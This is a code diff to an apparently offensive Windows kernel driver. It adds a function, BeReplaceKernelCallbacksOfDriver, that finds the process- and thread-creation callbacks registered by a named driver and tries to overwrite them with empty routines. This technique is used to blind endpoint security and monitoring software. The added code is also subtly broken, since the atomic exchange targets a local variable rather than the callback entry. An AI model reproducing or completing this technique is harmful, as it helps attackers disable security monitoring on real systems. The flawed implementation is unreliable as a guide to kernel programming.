@@ -159,7 +159,7 @@ BeEnumerateKernelCallbacks(CALLBACK_TYPE type)
 	auto data = ktd::vector<KernelCallback, PagedPool>();
 
 	// get address for the kernel callback array
-	UINT64 arrayAddr = BeGetKernelCallbackArrayAddr(type);
+	auto arrayAddr = BeGetKernelCallbackArrayAddr(type);
 	if (!arrayAddr)
 	{
 		LOG_MSG("Failed to get array addr for kernel callbacks");
@@ -176,13 +176,13 @@ BeEnumerateKernelCallbacks(CALLBACK_TYPE type)
 			continue;
 
 		// cast to callback routine block
-		EX_CALLBACK_ROUTINE_BLOCK currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);
+		auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);
 
 		// get function address
-		UINT64 callbackFunctionAddr = (UINT64)currCallbackBlock.Function;
+		auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;
 
 		// get corresponding driver
-		PKLDR_DATA_TABLE_ENTRY driver = BeGetDriverForAddress(callbackFunctionAddr);
+		auto driver = BeGetDriverForAddress(callbackFunctionAddr);
 
 		if (!driver)
 		{
@@ -191,7 +191,7 @@ BeEnumerateKernelCallbacks(CALLBACK_TYPE type)
 		}
 
 		// calculate offset of function
-		UINT64 offset = callbackFunctionAddr - (UINT64)(driver->DllBase);
+		auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);
 
 		// Print info
 		LOG_MSG("Callback: %ls, 0x%llx + 0x%llx", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);
@@ -207,6 +207,7 @@ BeEnumerateKernelCallbacks(CALLBACK_TYPE type)
 
 	return data;
 }
+
 
 /**
  * Empty callback routine to be used for replacing other kernel callback routines
@@ -232,4 +233,72 @@ BeEmptyCreateThreadNotifyRoutine(
 )
 {
 	LOG_MSG("Empty CreateThreadNotifyRoutine called\n");
+}
+
+/**
+ *
+ */
+NTSTATUS
+BeReplaceKernelCallbacksOfDriver(PWCH targetDriverBaseDllName, CALLBACK_TYPE type)
+{
+	// get address for the kernel callback array
+	auto arrayAddr = BeGetKernelCallbackArrayAddr(type);
+	if (!arrayAddr)
+	{
+		LOG_MSG("Failed to get array addr for kernel callbacks");
+		return STATUS_NOT_FOUND;
+	}
+	LOG_MSG("Array for callbacks: 0x%llx", arrayAddr);
+
+	for (INT i = 0; i < 16; ++i) // TODO: max number
+	{
+		// get current address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
+		auto currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);
+
+		if (!currCallbackBlockAddr)
+			continue;
+
+		// cast to callback routine block
+		auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);
+
+		// get function address
+		auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;
+
+		// get corresponding driver
+		auto driver = BeGetDriverForAddress(callbackFunctionAddr);
+
+		if (!driver)
+		{
+			LOG_MSG("Didnt find driver for callback");
+			continue;
+		}
+
+		// if it is the driver were looking for
+		if (wcscmp(driver->BaseDllName.Buffer, targetDriverBaseDllName) == 0)
+		{
+			// calculate offset of function
+			auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);
+
+			// Print info
+			LOG_MSG("Replacing callback with empty callback: %ls, 0x%llx + 0x%llx", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);
+
+			// Replace routine by empty routine
+			PVOID oldCallbackAddress;
+			switch (type)
+			{ // TODO: save old and restore
+			case CreateProcessNotifyRoutine:
+				oldCallbackAddress = (PVOID)InterlockedExchange64((LONG64*)&callbackFunctionAddr, (LONG64)BeEmptyCreateProcessNotifyRoutine);
+				break;
+			case CreateThreadNotifyRoutine:
+				oldCallbackAddress = (PVOID)InterlockedExchange64((LONG64*)&callbackFunctionAddr, (LONG64)BeEmptyCreateThreadNotifyRoutine);
+				break;
+			default:
+				LOG_MSG("Invalid callback type");
+				return STATUS_INVALID_PARAMETER;
+				break;
+			} 
+		}
+	}
+
+	return STATUS_SUCCESS;
 }
